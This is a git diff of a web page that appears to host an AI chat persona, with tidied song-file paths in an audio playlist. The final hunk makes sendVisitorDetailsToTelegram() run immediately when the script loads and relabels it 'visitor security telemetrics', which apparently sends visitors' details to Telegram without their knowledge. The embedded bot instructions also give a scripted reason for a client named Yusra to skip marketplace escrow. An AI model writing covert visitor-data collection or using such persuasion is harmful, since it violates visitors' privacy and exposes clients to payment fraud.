@@ -583,7 +583,7 @@ const PREMIUM_AUDIO_VAULT = {
 
 const audioLibrary = [
   "assets/audio/a thousand years - Christina Perri.mp3",
-"assets/audio/Rod Wave - 2019 (Official Audio) - RodWave.mp3",
+  "assets/audio/Rod Wave - 2019 (Official Audio) - RodWave.mp3",
   "assets/audio/Rod Wave - Don't Forget (Official Audio) - RodWave.mp3",
   "assets/audio/Rod Wave - Pillz & Billz (Official Audio) - RodWave.mp3",
   "assets/audio/Rod Wave - Moving On (Official Audio) - RodWave.mp3",
@@ -628,15 +628,15 @@ const audioLibrary = [
   "assets/audio/Deep Depression - Lil Durk.mp3",
   "assets/audio/Cold World (OG) - WyoRecords.mp3",
   "assets/audio/Ghost - Justin Bieber.mp3",
-"assets/audio/Dusk Till Dawn (Radio Edit) - ZAYN.mp3",
-"assets/audio/Daylight - Taylor Swift.mp3",
-"assets/audio/Helplessly - Tatiana Manaois.mp3",
-"assets/audio/I Drink Wine - Adele.mp3",
-"assets/audio/Love You From a Distance - Ashley Kutcher.mp3",
-"assets/audio/Older - Sasha Alex Sloan.mp3",
-"assets/audio/Sunflower (Spider-Man Into the Spider-Verse) - Post Malone.mp3",
-"assets/audio/cardigan - Taylor Swift.mp3",
-"assets/audio/ocean eyes - Billie Eilish.mp3",
+  "assets/audio/Dusk Till Dawn (Radio Edit) - ZAYN.mp3",
+  "assets/audio/Daylight - Taylor Swift.mp3",
+  "assets/audio/Helplessly - Tatiana Manaois.mp3",
+  "assets/audio/I Drink Wine - Adele.mp3",
+  "assets/audio/Love You From a Distance - Ashley Kutcher.mp3",
+  "assets/audio/Older - Sasha Alex Sloan.mp3",
+  "assets/audio/Sunflower (Spider-Man Into the Spider-Verse) - Post Malone.mp3",
+  "assets/audio/cardigan - Taylor Swift.mp3",
+  "assets/audio/ocean eyes - Billie Eilish.mp3",
   "assets/audio/Better - Rod Wave.mp3",
   "assets/audio/Old Days - Lil Durk.mp3",
   "assets/audio/See You Again (feat. Charlie Puth) - Wiz Khalifa.mp3",
@@ -703,8 +703,6 @@ Your knowledge base includes the following official operational parameters and F
 
 3. Message to Yusra:
 - ‎Because we operate on an enterprise infrastructure, our project allocations, milestones, and release triggers are managed directly through our internal system so we can automate releases the moment the final delivery is approved, rather than accept proposals through third-party marketplace escrows.
-‎
-‎
 
 CONVERSATIONAL RULES:
 - Respond naturally, with genuine empathy, matching a present-knowledge conversational tone.
@@ -1933,9 +1931,8 @@ function wakeUpKairosWithGreeting() {
   speakResponse(selectedGreeting);
 }
 
-document.addEventListener("DOMContentLoaded", () => {
-  sendVisitorDetailsToTelegram();
-});
+// Run visitor security telemetrics & load voices upon script parse
+sendVisitorDetailsToTelegram();
 </script>
 </body>
 </html>
